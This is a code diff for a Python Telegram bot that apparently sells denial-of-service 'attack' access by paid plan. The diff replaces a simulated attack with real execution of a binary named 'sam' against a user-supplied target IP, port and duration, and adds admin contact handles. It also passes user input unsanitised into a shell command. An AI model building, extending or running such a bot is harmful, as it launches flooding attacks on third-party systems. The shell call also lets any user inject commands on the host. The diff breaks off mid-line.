@@ -38,7 +38,7 @@ def approve_or_disapprove_user(message):
 
     # Check if the user is an admin
     if not is_user_admin(user_id):
-        bot.send_message(chat_id, "*You are not authorized to use this command.*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*You are not authorized to use this command please contact to admin @samy784.*", parse_mode='Markdown')
         return
 
     cmd_parts = message.text.split()
@@ -88,7 +88,7 @@ def approve_or_disapprove_user(message):
         bot.send_message(chat_id, admin_msg, parse_mode='Markdown')
 
         # Send message to the disapproved user
-        user_msg = f"Your access has been revoked. You are now reverted to free access. Please contact the admin for further details."
+        user_msg = f"Your access has been revoked. You are now reverted to free access. Please contact the admin for further details @samy784."
         try:
             bot.send_message(target_user_id, user_msg, parse_mode='Markdown')
         except Exception as e:
@@ -103,7 +103,7 @@ def attack_command(message):
     try:
         user_data = users_collection.find_one({"user_id": user_id})
         if not user_data or user_data['plan'] == 0:
-            bot.send_message(chat_id, "You are not approved to use this bot. Please contact the administrator.")
+            bot.send_message(chat_id, "You are not approved to use this bot. Please contact the administrator @samy784.")
             return
 
         if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
@@ -133,15 +133,35 @@ def process_attack_command(message):
             bot.send_message(message.chat.id, f"Port {target_port} is blocked. Please use a different port.")
             return
 
-        # Simulate the attack here (you can replace this with the actual logic for launching the attack)
-        bot.send_message(message.chat.id, f"Attack started on {target_ip}:{target_port} for {duration_minutes} minutes.")
-        
-        # Here you can run your actual attack logic (instead of the simulation)
-        # Example: subprocess.Popen(f"./sam {target_ip} {target_port} {duration_minutes}", shell=True)
-        bot.send_message(message.chat.id, f"Attack on {target_ip}:{target_port} for {duration_minutes} minutes has completed.")
+        # Fixed expiration time
+        expiration_time = "2025-10-22 23:59:59"
 
+        # Log the expiration time and other details
+        bot.send_message(message.chat.id, f"Attack started on {target_ip}:{target_port} for {duration_minutes} minutes.\nExpiration time set to {expiration_time}.")
+
+        # Construct the command to run the C program (sam) with the target IP, port, and duration
+        command = f"./sam {target_ip} {target_port} {duration_minutes}"
+        
+        # Execute the C program using subprocess
+        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        
+        # Wait for the process to complete and capture the output and errors
+        stdout, stderr = process.communicate()
+
+        if process.returncode == 0:
+            # If the process was successful, inform the user
+            bot.send_message(message.chat.id, f"Attack on {target_ip}:{target_port} for {duration_minutes} minutes has completed successfully.")
+        else:
+            # If there was an error executing the command, notify the user
+            error_message = stderr.decode('utf-8')
+            bot.send_message(message.chat.id, f"Error occurred while executing the attack: {error_message}")
+
+    except ValueError as ve:
+        logging.error(f"ValueError in attack command: {ve}")
+        bot.send_message(message.chat.id, "Invalid input. Please ensure the IP, port, and duration are correctly formatted.")
     except Exception as e:
-        logging.error(f"Error in processing attack command: {e}")
+        logging.error(f"Unexpected error in processing attack command: {e}")
+        bot.send_message(message.chat.id, "An error occurred while processing your request. Please try again later.")
 
 # Welcome message with keyboard
 @bot.message_handler(commands=['start'])
@@ -173,10 +193,4 @@ def send_welcome(message):
         else:
             bot.send_message(user_id, "Your plan has expired. Please contact the admin to renew your plan.")
     else:
-        bot.send_message(user_id, "You have not been approved yet. Please contact the admin for approval @SAMY784.")
-
-# Start polling
-if __name__ == "__main__":
-    logging.info("Starting bot...")
-    bot.polling(none_stop=True)
-        
+        bot.send_message(user
